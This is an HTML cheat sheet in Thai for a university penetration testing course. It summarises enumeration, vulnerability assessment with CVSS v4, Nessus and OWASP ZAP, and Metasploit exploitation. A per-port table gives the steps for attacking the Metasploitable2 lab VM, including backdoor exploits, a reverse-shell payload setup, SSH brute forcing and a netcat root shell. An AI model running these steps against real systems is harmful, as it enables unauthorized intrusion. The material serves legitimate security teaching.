@@ -1,0 +1,254 @@
+<!doctype html>
+<html lang="th">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>A4 สรุป 2/2 — L4 Enumeration · L5 Vulnerability Assessment · L6 Exploitation</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="a4.css">
+</head>
+<body>
+
+  <nav class="navbar">
+    <div class="nav-inner">
+      <a href="index.html" class="brand"><img src="icon.jpg" alt="PenTest Logo" class="brand-logo">Roadmap</a>
+      <a href="summary1.html" title="สรุป A4 แนวนอน หน้า 1/2 (L1-L3)">A4-1</a>
+      <a href="summary2.html" class="active" title="สรุป A4 แนวนอน หน้า 2/2 (L4-L6)">A4-2</a>
+      <a href="L1.html">L1</a>
+      <a href="L2.html">L2</a>
+      <a href="L3.html">L3</a>
+      <a href="L4.html">L4</a>
+      <a href="L5.html">L5</a>
+      <a href="L6.html">L6</a>
+      <a href="L7.html">L7</a>
+    </div>
+  </nav>
+
+  <main class="sheet">
+
+    <header class="sheet-head">
+      <img src="icon.jpg" alt="logo" class="cs-logo">
+      <h1>PenTest สรุปละเอียดทุก Step — A4 แนวนอน หน้า 2/2 : L4 Enumeration · L5 Vulnerability Assessment · L6 Exploitation (Metasploit)</h1>
+      <div class="pager"><a class="home" href="index.html">Home</a><a href="summary1.html">← หน้า 1</a></div>
+    </header>
+
+    <div class="cols">
+
+    <!-- ================= L4 ================= -->
+    <section class="sec">
+      <div class="sec-h"><span>L4 · Enumeration &amp; Service Discovery</span><small>เจาะลึกจากผล Scan</small></div>
+      <p><strong>Enumeration:</strong> ดึง detail เชิงลึกจาก services/ports ที่เปิด — valid usernames, machine/share/directory names, configs, hidden paths ต้องใช้ time + patience ทำ manual หรือ automated แต่ต้อง thorough</p>
+      <ul>
+        <li>เทคนิคยอดฮิต: Email IDs/Usernames (→ brute-force) · Default passwords (ระบบตั้งค่าไม่ปลอดภัย) · DNS zone transfer (เปิด topology)</li>
+        <li>Active scanning = ส่ง request วิเคราะห์ response (พบครบแต่ noisy/disruptive) vs Passive = ฟัง traffic เงียบแต่ coverage น้อย</li>
+        <li>Ports น่า enum: FTP21 SSH22 SMTP25 HTTP80 POP3 110 IMAP143 SNMP161 NetBIOS 137–139 SMB445 HTTPS443</li>
+      </ul>
+      <div class="sub">SMB / Samba (TCP 139/445)</div>
+      <table class="tbl">
+        <tr><th>Tool</th><th>Usage</th></tr>
+        <tr><td>smbclient</td><td><code>smbclient -L \\&lt;IP&gt;</code> list shares · <code>smbclient //&lt;IP&gt;/share</code> connect (Enter = anonymous login)</td></tr>
+        <tr><td>SMBMap</td><td><code>smbmap -H &lt;IP&gt;</code> list drives/perms/contents, upload/download, pattern matching</td></tr>
+        <tr><td>enum4linux</td><td><code>enum4linux [-a] &lt;IP&gt;</code>: -U usernames (ต้องการ RestrictAnonymous=0) · -G groups · -S shares · -o OS via smbclient · -u user -p pass กรณี block anonymous</td></tr>
+      </table>
+      <div class="sub">Nmap NSE enumeration</div>
+      <table class="tbl">
+        <tr><th>Script</th><th>Syntax / ได้อะไร</th></tr>
+        <tr><td>smb-enum-users</td><td><code>nmap --script smb-enum-users.nse &lt;host&gt;</code> — SMB_COM_NEGOTIATE เผย signing/auth-level/plaintext pwd/time-timezone</td></tr>
+        <tr><td>smb-enum-groups</td><td><code>nmap --script smb-enum-groups.nse -p445 &lt;host&gt;</code> — authorization roles + members</td></tr>
+        <tr><td>smb-enum-shares</td><td><code>nmap --script smb-enum-shares.nse -p445 &lt;host&gt;</code> — shares ผ่าน MSRPC → attack surface ภายใน</td></tr>
+        <tr><td>smb-enum-processes</td><td><code>nmap --script smb-enum-processes.nse --script-args smbusername=&lt;u&gt;,smbpass=&lt;p&gt; -p445</code> — processes/services บน Windows (ต้องมี creds อ่าน status ได้)</td></tr>
+        <tr><td>nbstat / NBTscan</td><td><code>nmap -sV &lt;IP&gt; --script nbstat.nse</code> (137–139) · <code>nbtscan -v -s : 192.168.37.0/24</code> NetBIOS names → หา open shares</td></tr>
+      </table>
+      <div class="sub">RPC / NFS (TCP 111, UDP/TCP 2049)</div>
+      <p>UNIX เปิด TCP 111 = RPC portmapper · <code>rpcinfo -p &lt;IP&gt;</code> → program/version/port (portmapper, nfs, mountd) · <code>showmount -e &lt;IP&gt;</code> → NFS exports (เช่น share "/" root!) · scanner ส่ง NULL commands ไป RPC-bound ports เดา function ได้</p>
+      <div class="sub">Web application enum (80/443)</div>
+      <ul>
+        <li><code>nmap -sV --script=http-enum &lt;IP&gt;</code> brute paths จาก list รู้จัก → /phpMyAdmin/, /phpinfo.php, Apache/Tomcat default manager</li>
+        <li><code>nikto -h &lt;IP&gt;</code> open-source web vuln scanner — misconfig + risky files</li>
+      </ul>
+      <div class="sub">Fingerprint เพิ่ม</div>
+      <p><code>nmap -sC &lt;IP&gt;</code> = รัน common NSE ตามพอร์ตที่เปิด → enum + fingerprint apps/OS ได้ทันที</p>
+      <div class="sub">Lab steps</div>
+      <ol>
+        <li><code>nmap -sV -p 139,445 &lt;IP&gt;</code> + <code>smbclient -L \\&lt;IP&gt;</code></li>
+        <li><code>enum4linux -a &lt;IP&gt;</code> users/groups/OS</li>
+        <li><code>rpcinfo -p &lt;IP&gt;</code> + <code>showmount -e &lt;IP&gt;</code></li>
+        <li><code>nmap -p 80,443 --script http-enum &lt;IP&gt;</code> → hidden paths</li>
+        <li><code>nikto -h &lt;IP&gt;</code> web vulns</li>
+      </ol>
+      <div class="note-s"><strong>Assignment:</strong> ภาพ <code>nmap -sV -p 8888</code> · TCP connect scan → mscan.txt + cat · output enum4linux / showmount / http-enum</div>
+    </section>
+
+    <!-- ================= L5 ================= -->
+    <section class="sec">
+      <div class="sec-h"><span>L5 · Vulnerability Assessment</span><small>PTES: Vulnerability Analysis</small></div>
+      <p><strong>VA</strong> = identify / classify / prioritize ช่องโหว่บน systems/networks/software เทียบ known DB — focus discovery &amp; evaluation ไม่ใช่ break-in · ประเมิน detection/response ของ common attacks (DoS, MITM, SQL Injection, Network Intrusion)</p>
+      <div class="note-s"><strong>VA vs PT:</strong> VA เช็ค known vulnerabilities (กว้าง) — PT เจาะผ่าน defenses พิสูจน์ impact (ลึก) — methods คล้ายแต่ objective ต่าง ใช้คู่กันไม่แทนกัน</div>
+      <div class="sub">ชนิดของ Vulnerability</div>
+      <ul>
+        <li><strong>Technological:</strong> flaw ใน software/tech (bug ใน app X → control system Y ได้)</li>
+        <li><strong>Configuration:</strong> ตั้งค่าผิด (เปิด RDP port บน firewall ของ AD server)</li>
+        <li><strong>Policy:</strong> ไม่มี/ไม่ทำตาม policy (ประตู data center ไม่ล็อก)</li>
+      </ul>
+      <div class="sub">VA management tasks / analyzers</div>
+      <ul>
+        <li>Scan environment → generate full report → analyze → prioritize by risk → ตัด false positives → report real vulns</li>
+        <li>Analyzer: scan+enumerate พร้อมกันจาก interface เดียว จัด risk ตาม OS/service/app version เทียบ DB อัปเดตล่าสุด</li>
+        <li>Scanner ทำงาน: probe ส่งข้อมูล → วิเคราะห์ fingerprint response → ports/services/OS/vulns</li>
+        <li>Pros: automation (recon/port/service/version detection) เร็วกว่า manual · Cons: loud (traffic โดน detect ง่าย), false positives + false negatives</li>
+        <li>แนวทาง: automated (Nessus/OpenVAS เทียบ DB) + manual deep-dive ให้ครบถ้วน</li>
+      </ul>
+      <table class="tbl">
+        <tr><th>Risk</th><th>ความหมาย</th><th>การจัดการ</th></tr>
+        <tr><td>High</td><td>critical vulns โจมตีง่าย → control เต็มระบบ/compromise ข้อมูล</td><td>แก้ทันที (immediate)</td></tr>
+        <tr><td>Medium</td><td>severe แต่ exploit ซับซ้อน / access จำกัด</td><td>ระยะสั้น</td></tr>
+        <tr><td>Low</td><td>moderate — เปิดข้อมูลให้ attacker ใช้ต่อ</td><td>mitigate ตามสมควร ไม่ด่วน</td></tr>
+      </table>
+      <div class="sub">VA steps (7)</div>
+      <ol>
+        <li>เช็ค target alive ด้วย ICMP ping</li>
+        <li>Scan ports แบบ stealth + ทดสอบด้วย harmful information</li>
+        <li>ระบุ potential vulns + generate report ด้วย network vuln scanner</li>
+        <li>Classify vulns + build responses (บาง response non-actionable จาก complexity/risk)</li>
+        <li>Classify key assets เป็น hierarchy → drive risk management</li>
+        <li>Follow-up docs/reports/consulting หลัง assessment</li>
+        <li>Initiate ongoing security effort (แผนรักษาความปลอดภัยต่อเนื่อง)</li>
+      </ol>
+      <div class="sub">CVSS v4.0 (จัดการโดย FIRST)</div>
+      <ul>
+        <li>4 metric groups: <strong>Base / Threat / Environmental / Supplemental</strong> · Nomenclature: CVSS-B, CVSS-BT, CVSS-BE, CVSS-BTE (เน้น actual risk มากกว่า theoretical severity)</li>
+        <li><strong>Base:</strong> Exploitability — Attack Vector AV: Network/Adjacent/Local/Physical · Attack Complexity AC: Low/High · Attack Requirements AT: None/Present · Privileges Required PR · User Interaction UI · Impact — VC/VI/VA (vulnerable sys) + SC/SI/SA (subsequent sys)</li>
+        <li><strong>Environmental:</strong> Security Requirements CR/IR/AR (Low/Med/High ตาม CIA) + Modified impact metrics MVC…MSA (segmentation ลด blast radius)</li>
+        <li><strong>Supplemental</strong> (ไม่กระทบ score แต่ให้ context): Safety S(P/N/X) · Automatable AU(Y/N "wormable") · Recovery R(A/U/I) · Value Density V(D/C) · Response Effort RE(L/M/H) · Provider Urgency U(Clear/Green/Amber/Red)</li>
+      </ul>
+      <table class="tbl">
+        <tr><th>Band</th><th>Score</th><th>Band</th><th>Score</th></tr>
+        <tr><td>None</td><td>0.0</td><td>High</td><td>7.0–8.9</td></tr>
+        <tr><td>Low</td><td>0.1–3.9</td><td>Critical</td><td>9.0–10.0</td></tr>
+        <tr><td>Medium</td><td>4.0–6.9</td><td colspan="2">Calculator: nvd.nist.gov/vuln-metrics/cvss/v4-calculator</td></tr>
+      </table>
+      <div class="sub">CVE / CWE / KEV / SSVC</div>
+      <ul>
+        <li><strong>CVE</strong> (MITRE): ID เฉพาะ เช่น CVE-2011-2523 (vsftpd 2.3.4 backdoor), CVE-2014-3566 (POODLE = Padding Oracle On Downgraded Legacy Encryption, SSLv3), CVE-2012-1823 (PHP-CGI RCE) — ค้นที่ cve.org / cve.mitre.org</li>
+        <li><strong>CWE:</strong> community list ของ weaknesses = root causes ของ CVE records</li>
+        <li><strong>KEV:</strong> Known Exploited Vulnerabilities — actively exploited จริงใน wild ต้องรีบแก้ (record มี catalog link + date added)</li>
+        <li><strong>SSVC:</strong> วิเคราะห์ตาม exploitation status / safety impact / prevalence ในระบบ</li>
+        <li>Lab: คำนวณ CVSS v4 ของ CVE-2011-2523 (Base + VS/SS metrics SC/SI/SA = None)</li>
+      </ul>
+      <div class="sub">VA report components</div>
+      <p>Executive Summary (scope/method/key findings/severity/impact/recs) · Introduction (purpose/scope/methodology/audience) · Findings (ID/desc/location/impact/evidence-PoC/risk แยก Critical→Low) · Risk Assessment (posture/prioritization/critical assets) · Recommendations (actionable, prioritized remediation, cost-benefit) · Appendix (scans/logs/screenshots/diagrams) — <strong>Tips:</strong> ภาษาชัด ไม่ใช้ jargon · ใช้กราฟ/ตาราง · focus high-severity · rec ที่ทำได้จริง</p>
+    </section>
+
+    <!-- ================= L5 Lab ================= -->
+    <section class="sec">
+      <div class="sec-h"><span>L5 · Tools &amp; Lab</span><small>NSE → Nessus → OWASP ZAP</small></div>
+      <div class="sub">1) Nmap NSE scripts</div>
+      <ul>
+        <li>Scripts เขียนด้วย Lua อยู่ <code>/usr/share/nmap/scripts</code> · อัปเดต DB: <code>sudo nmap --script-updatedb</code></li>
+        <li><code>nmap --script vuln &lt;Target_IP&gt;</code> → เจอ <code>ftp-vsftpd-backdoor</code> (CVE-2011-2523), <code>ssl-poodle</code> (CVE-2014-3566)</li>
+        <li><code>nmap --script ftp-anon &lt;Target_IP&gt;</code> เช็ค anonymous FTP login</li>
+        <li><code>nmap --script ssh-auth-methods.nse &lt;Target_IP&gt;</code> ตรวจ auth methods ที่เปิด</li>
+      </ul>
+      <div class="sub">2) Tenable Nessus (host/network scanner)</div>
+      <ol>
+        <li>Register Nessus Essentials (ฟรี ≤16 IP — activation code ส่งเข้า email) จาก tenable.com (รองรับ Mac/Ubuntu/AARCH64)</li>
+        <li>Install: <code>sudo dpkg -i Nessus-10.9.1-debian10_amd64.deb</code></li>
+        <li>Start service: <code>sudo systemctl start nessusd</code> (/bin/systemctl start nessusd.service)</li>
+        <li>Browser <code>https://localhost:8834</code> → register + activate → ตั้ง username/password (เช่น nessus / kali)</li>
+        <li>New Scan → template <strong>Basic Network Scan</strong> → ตั้งชื่อ scan + targets: IP เดี่ยว / comma-separated หลาย IP / range <code>192.168.1.1-192.168.1.128</code> / subnet <code>192.168.1.0/24</code> / domain target.com → (optional) Schedule scan → Save → Launch</li>
+        <li>วิเคราะห์: แท็บ Vulnerabilities → กรอง CRITICAL/HIGH → อ่าน Description + Solution (Remediation steps) ของแต่ละ plugin</li>
+      </ol>
+      <p>จุดเด่น: DB vuln ใหญ่กว่า OpenVAS · local/remote/credentialed scans + social engineering checks · รายงานละเอียด (desc/severity/remediation/plugin) · compliance auditing</p>
+      <div class="sub">3) OWASP ZAP (Zed Attack Proxy) — webapp</div>
+      <ol>
+        <li>Install: <code>sudo apt update</code> → <code>sudo apt install zaproxy</code> (หรือโหลด installer จาก zaproxy.org)</li>
+        <li>Run <code>zaproxy</code> → เลือก Standard UI → <strong>Persist Session</strong> กำหนดไฟล์ .zap (เช่น my_metasploitable_session.zap)</li>
+        <li>Firefox → Settings → Network Settings → Manual proxy: HTTP + SSL = <code>127.0.0.1:8080</code> ✓ "Also use this proxy for HTTPS"</li>
+        <li>ติดตั้ง CA certificate: browse <code>http://zap/</code> → download Root CA cert → Import ใน browser (จำเป็นสำหรับ HTTPS)</li>
+        <li>เปิด <code>http://&lt;Target_IP&gt;/</code> ผ่าน proxy → คลิกขวา host ใน Sites tree → Attack → Active Scan (หรือใช้ Quick Start → Automated Scan กรอก URL ตรงๆ)</li>
+        <li>ดูผลที่แท็บ Alerts: Remote Code Execution (CVE-2012-1823), Path Traversal, Missing Security Headers …</li>
+        <li>Report menu → Generate HTML report ส่งออกได้</li>
+      </ol>
+      <div class="note-s"><strong>Assignment (p84):</strong> Nessus รายงานช่องโหว่ CRITICAL บน Metasploitable2 ของตัวเอง — พบที่ port ใด / service อะไร + เปรียบเทียบผล Nessus (host/OS/network-wide) vs ZAP (webapp layer port 80) · ตั้งชื่อไฟล์ Section+Lab+รหัส เช่น S1L5_6604061234567.pdf</div>
+    </section>
+
+    <!-- ================= L6 ================= -->
+    <section class="sec">
+      <div class="sec-h"><span>L6 · Exploitation (Metasploit)</span><small>PTES: Exploitation — พิสูจน์ว่าเจาะได้จริง</small></div>
+      <p><strong>Exploit</strong> = bypass security flaw/control; vector ต่างกันตาม OS/service/process ของเป้าหมาย เป้าปลายทางคือ unauthorized access / control / information — พิสูจน์ potential impact + ความลึกของ flaw</p>
+      <div class="sub">Goals &amp; key activities</div>
+      <ul>
+        <li>Goals: Validate vulns exploitable · Assess impact/damage · Gain unauthorized access · Elevate privileges → admin/root/SYSTEM · Establish persistence</li>
+        <li>Activities: PoC (script/tool พิสูจน์) · Exploit development custom · Gaining access (shell/privesc/exfil) · Lateral movement ขยาย footprint</li>
+      </ul>
+      <div class="sub">Steps (4)</div>
+      <ol>
+        <li><b>Preparation/Planning:</b> เลือก vulns promising (severity/impact/exploitability) เตรียม/customize exploit</li>
+        <li><b>Execution:</b> launch exploit → initial foothold (account/shell/webapp control)</li>
+        <li><b>Post-Exploitation:</b> privesc www-data→root/SYSTEM · system enum (sw, net config, sec settings) · data exfiltration · persistence (backdoor/accounts/config)</li>
+        <li><b>Cleanup &amp; Docs:</b> ลบ artifacts กัน detect + document findings</li>
+      </ol>
+      <div class="sub">Tools / techniques</div>
+      <p>Frameworks: Metasploit, Core Impact, Canvas (prebuilt) · custom exploits · manual (code injection, param manipulation) · social engineering (phishing, pretexting)</p>
+      <div class="sub">Metasploit Framework (Ruby)</div>
+      <ul>
+        <li>Pentest system + platform พัฒนา tools — module launcher: configure exploit → launch; สำเร็จ → payload runs → shell interact · hundreds exploits/dozens payloads</li>
+        <li><strong>vs Scanner:</strong> scanner passive เช็ค/report เท่านั้น · Metasploit = actual exploitation tool</li>
+        <li><strong>Architecture:</strong> Rex (sockets TCP/UDP/SSL/HTTP/SMB) → MSF Core (events/sessions/UI/module mgmt) → MSF Base (msfconsole APIs) · UIs: msfcli / msfconsole / Armitage(web GUI)</li>
+      </ul>
+      <table class="tbl">
+        <tr><th>Module</th><th>หน้าที่</th></tr>
+        <tr><td>Exploits</td><td>PoC code โจมตี specific vuln (buffer overflow/RCE) deliver payload</td></tr>
+        <tr><td>Payloads</td><td>โค้ดรันบนเครื่องเหยื่อหลังสำเร็จ — reverse/bind shell, meterpreter</td></tr>
+        <tr><td>Encoders</td><td>obfuscate payload หลบ AV/firewall/IDS/IPS</td></tr>
+        <tr><td>Auxiliary</td><td>scan/fuzz/brute-force ไม่ส่ง payload</td></tr>
+        <tr><td>NOP</td><td>assembly filler ให้ payload space สม่ำเสมอ</td></tr>
+        <tr><td>Post</td><td>privesc, harvest creds, extract data หลังเจาะ</td></tr>
+        <tr><td>Evasion</td><td>payloads หลบ EDR/Antivirus</td></tr>
+      </table>
+      <div class="sub">Commands</div>
+      <p><code>msfconsole</code> เปิด · <code>search kw</code> กรอง type:/cve:/platform:/rank: (เช่น <code>search type:exploit name:vsftpd</code>, <code>search cve:2011-2523</code>) · <code>use path|#index</code> · <code>back</code> ออก · <code>info</code> options/refs(CVE/BID)/authors · <code>show options</code> (required ไฮไลต์) · <code>show payloads</code> · <code>set OPT VAL</code> · <code>setg</code> global · <code>exploit/run</code> · <code>sessions -l</code> list / <code>sessions -i N</code> interact</p>
+      <div class="sub">Key settings &amp; connections</div>
+      <p>RHOST(S) target addr · RPORT remote port · LHOST IP Kali (reverse) · LPORT port รับ reverse (default 4444) · Target OS/version · timeout(นาที) · Connection: <b>Auto</b> (bind ถ้า NAT ไม่งั้น reverse) · <b>Bind</b> attacker→target (target หลัง NAT/FW) · <b>Reverse</b> target connect-back (attacker unreachable)</p>
+      <div class="sub">Workflow (8 steps)</div>
+      <p>msfconsole → search missing_patch/CVE → use path → show payloads → set payload path → show options → set ครบทุก option → exploit</p>
+    </section>
+
+    <section class="sec">
+      <div class="sec-h"><span>L6 · Lab exploits by port</span><small>Metasploitable2 — ทีละขั้น</small></div>
+      <table class="tbl">
+        <tr><th>Port</th><th>Steps</th></tr>
+        <tr><td>21 vsftpd 2.3.4</td><td><code>search vsftpd</code> → <code>use exploit/unix/ftp/vsftpd_234_backdoor</code> → set RHOSTS → <code>exploit</code> → root! ยืนยัน <code>id</code>/<code>uname -a</code>/<code>whoami</code> · Alt script: <code>searchsploit vsftpd 2.3.4</code> → <code>searchsploit -m 49757</code> (-m mirror → cwd) → <code>python2 49757.py &lt;IP&gt;</code></td></tr>
+        <tr><td>22 SSH brute</td><td><code>nano meta.txt</code> user/pass pairs (ต้องมี msfadmin msfadmin) → <code>use auxiliary/scanner/ssh/ssh_login</code> → set RHOSTS · STOP_ON_SUCCESS true · USERPASS_FILE /home/kali/meta.txt → exploit → <code>sessions -i 1</code></td></tr>
+        <tr><td>23 Telnet</td><td>banner บอก msfadmin/msfadmin → <code>telnet &lt;IP&gt; -l msfadmin</code> + pwd msfadmin → id/uname/whoami</td></tr>
+        <tr><td>25 SMTP enum</td><td><code>use auxiliary/scanner/smtp/smtp_enum</code> set RHOSTS + THREADS ↑ → usernames; ยืนยัน nc VRFY mail / VRFY sshd</td></tr>
+        <tr><td>6667 UnrealIRCd</td><td><code>use exploit/unix/irc/unreal_ircd_3281_backdoor</code> set RHOSTS/RPORT → <code>set PAYLOAD cmd/unix/reverse</code> → set LHOST (Kali) LPORT 4444 → exploit → msf เปิด listener, target connect back</td></tr>
+        <tr><td>5900 VNC 3.3</td><td><code>search vnc login</code> → select → set RHOSTS → exploit (password 'password')</td></tr>
+        <tr><td>139/445 Samba</td><td><code>sudo nmap -sV --script vulners -p 139,445 &lt;IP&gt;</code> → <code>search smb version</code> → <code>use auxiliary/scanner/smb/smb_version</code> run → Samba 3.0.20-Debian → <code>searchsploit samba 3.0.20</code> → <code>search samba user map</code> → <code>use 0</code> (usermap_script) → exploit → root · ลอง 445 ด้วย · <code>smbclient -L \\IP</code> · <code>smbclient //IP/tmp</code> (Enter=anon) → <code>mkdir &lt;studentID&gt;</code> → <code>ls</code></td></tr>
+        <tr><td>1524 Ingreslock</td><td><code>nmap -sV --script=vuln -p1524 &lt;IP&gt;</code> → <code>nc -nv &lt;IP&gt; 1524</code> → root prompt ทันที (backdoor)</td></tr>
+        <tr><td>3632 DISTCC</td><td><code>service postgresql status</code>/start ก่อน → distcc exec → <code>set payload payload/cmd/unix/bind_ruby</code> → exploit → hostname/whoami/ifconfig</td></tr>
+        <tr><td>5432 PostgreSQL</td><td><code>search postgres</code> → <code>use auxiliary/scanner/postgres/postgres_login</code> → RHOSTS + STOP_ON_SUCCESS true → run</td></tr>
+        <tr><td>2049 NFS</td><td><code>rpcinfo -p &lt;IP&gt;</code> registered RPC · <code>showmount -e &lt;IP&gt;</code> shared dirs</td></tr>
+      </table>
+      <div class="sub">Armitage (Metasploit GUI)</div>
+      <p><code>sudo apt install armitage -y</code> → <code>sudo systemctl start postgresql</code> → <code>sudo msfdb init</code> → launch → Hosts → Nmap Scan → Quick Scan (OS Detect) → Targets = IP Metasploitable2 → จัดการ hosts/exploits/sessions ผ่าน GUI</p>
+      <div class="note-s"><strong>Assignment (p96):</strong> สร้าง directory ชื่อนักศึกษาใน /tmp ของ Metasploitable2 จาก Kali (smbclient/shell) + ls · ยืนยันฝั่ง target: cd /tmp → ls -l ก่อน-หลัง แคปภาพทั้งสองเครื่อง</div>
+    </section>
+
+    </div>
+
+    <div class="sheet-foot">
+      <span>Penetration Testing &amp; Protection (0406136051) — แผ่นสรุป A4 แนวนอน</span>
+      <span>หน้า 2/2 · L4–L6 · จากหน้า 1/2: L1–L3</span>
+    </div>
+
+
+
+
+
+  </main>
+</body>
+</html>
